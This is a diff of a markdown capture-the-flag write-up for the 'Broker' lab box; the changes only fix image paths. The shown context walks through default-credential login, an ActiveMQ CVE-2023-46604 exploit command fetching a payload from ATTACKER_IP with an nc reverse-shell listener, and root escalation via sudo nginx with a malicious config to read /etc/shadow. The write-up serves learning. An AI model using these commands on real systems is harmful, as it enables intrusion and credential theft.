@@ -82,7 +82,7 @@ There are nine ports open:
 
 The landing page on port 80 prompts a sign in for the website. Supplying `admin:admin` while testing for default credentials grants a successful login.
 
-![](../assets/img/2026-02-18-Broker/1.png)
+![](/assets/img/2026-02-18-Broker/1.png)
 
 Now that we're able to authenticate, I run a few Gobuster scans to discover subdirectories/subdomains in the background. 
 
@@ -111,11 +111,11 @@ Starting gobuster in directory enumeration mode
 
 Heading over to the `/admin` page discloses the version of Apache ActiveMQ that is running on the system. I find it a bit strange that this is running on an nginx server but I digress.
 
-![](../assets/img/2026-02-18-Broker/2.png)
+![](/assets/img/2026-02-18-Broker/2.png)
 
 Navigating to `/api/` shows a subdirectory for web info that we can fuzz as well, although this ultimately doesn't reveal anything.
 
-![](../assets/img/2026-02-18-Broker/3.png)
+![](/assets/img/2026-02-18-Broker/3.png)
 
 ## RCE via ActiveMQ
 Since we know what version of ActiveMQ is running, I do some research in order to find any vulnerabilities for it. This reveals [CVE-2023–46604](https://nvd.nist.gov/vuln/detail/cve-2023-46604) which explains that attackers can use the Java OpenWire protocol marshaller to run arbitrary shell commands by manipulating serialized class types. This causes either the client or the broker to instantiate any class on the classpath which can lead to critical RCE on affected systems.
@@ -136,16 +136,16 @@ nc -lvnp 9001
 go run main.go -i MACHINE_IP -p 61616 -u http://ATTACKER_IP:8081/poc-linux.xml
 ```
 
-![](../assets/img/2026-02-18-Broker/4.png)
+![](/assets/img/2026-02-18-Broker/4.png)
 
 We get a successful shell on the box as the ActiveMQ user and can grab the user flag under their home directory.
 
-![](../assets/img/2026-02-18-Broker/5.png)
+![](/assets/img/2026-02-18-Broker/5.png)
 
 ## Privilege Escalation
 Next, I start internal enumeration to escalate privileges to root. Checking the usual routes like SUID bits on binaries, loose security on backups, and cronjobs running scripts reveals nothing crazy. Our account does have access to run the nginx special binary for the web server on port 80.
 
-![](../assets/img/2026-02-18-Broker/6.png)
+![](/assets/img/2026-02-18-Broker/6.png)
 
 ### Malicious Web Server
 Because we can we can outright run the binary as root user and not just commands within it, we're able to specify our own malicious nginx config file that forces the server to host files from the systems root. [This document page](https://docs.nginx.com/) has examples for quick server configs, I end up just using:
@@ -172,10 +172,10 @@ sudo /usr/sbin/nginx -c /tmp/nginx.conf
 
 Finally, we can use the cURL tool to grab files off of the newly created server. For an actual shell, we can read `/etc/shadow` and try to crack root password (this doesn't return anything).
 
-![](../assets/img/2026-02-18-Broker/7.png)
+![](/assets/img/2026-02-18-Broker/7.png)
 
 Using the same method to grab the root flag completes this box.
 
-![](../assets/img/2026-02-18-Broker/8.png)
+![](/assets/img/2026-02-18-Broker/8.png)
 
 That's all y'all, this box was fairly easy and showed how outdated software versions can lead to a full system takeover. Keep your systems up to patch and set stronger passwords for mitigation. I hope this was helpful to anyone following along or stuck and happy hacking!
